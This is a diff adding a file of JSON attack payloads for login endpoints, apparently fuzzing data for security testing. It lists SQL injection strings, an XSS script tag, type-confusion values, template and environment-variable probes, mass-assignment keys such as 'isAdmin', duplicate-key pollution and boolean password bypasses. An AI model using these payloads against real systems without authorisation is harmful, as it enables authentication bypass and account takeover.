@@ -1,0 +1,50 @@
+# JSON Attack Payloads for Authentication Endpoints
+# Type confusion attacks
+{"login": null, "password": null}
+{"login": true, "password": false}
+{"login": 123, "password": 456}
+{"login": ["admin"], "password": ["password"]}
+{"login": {"username": "admin"}, "password": {"password": "password"}}
+
+# Empty/whitespace
+{"login": "", "password": ""}
+{"login": " ", "password": " "}
+
+# SQL Injection in JSON
+{"login": "admin' --", "password": "password"}
+{"login": "admin\" --", "password": "password"}
+{"login": "' OR 1=1--", "password": "x"}
+
+# XSS in JSON
+{"login": "<script>alert(1)</script>", "password": "password"}
+{"login": "<h1>admin</h1>", "password": "password"}
+
+# Unicode
+{"login": "\u0061\u0064\u006D\u0069\u006E", "password": "\u0070\u0061\u0073\u0073"}
+
+# Control characters
+{"login": "admin\u0000", "password": "password\u0000"}
+{"login": "ad\nmin", "password": "pa\nssword"}
+{"login": "ad\tmin", "password": "pa\tssword"}
+
+# Environment variables
+{"login": "${USER}", "password": "${PASS}"}
+{"login": "{{config}}", "password": "{{secret}}"}
+
+# Extra keys for mass assignment
+{"login": "admin", "password": "password", "admin": true}
+{"login": "admin", "password": "password", "role": "admin"}
+{"login": "admin", "password": "password", "isAdmin": true}
+
+# Parameter pollution
+{"login": "admin", "login": "victim", "password": "password"}
+
+# Nested objects
+{"login": {"innerLogin": "admin"}, "password": {"innerPassword": "password"}}
+
+# Array wrapping
+{"login": [["admin"]], "password": [["password"]]}
+
+# Boolean bypass
+{"login": "admin", "password": true}
+{"login": true, "password": true}
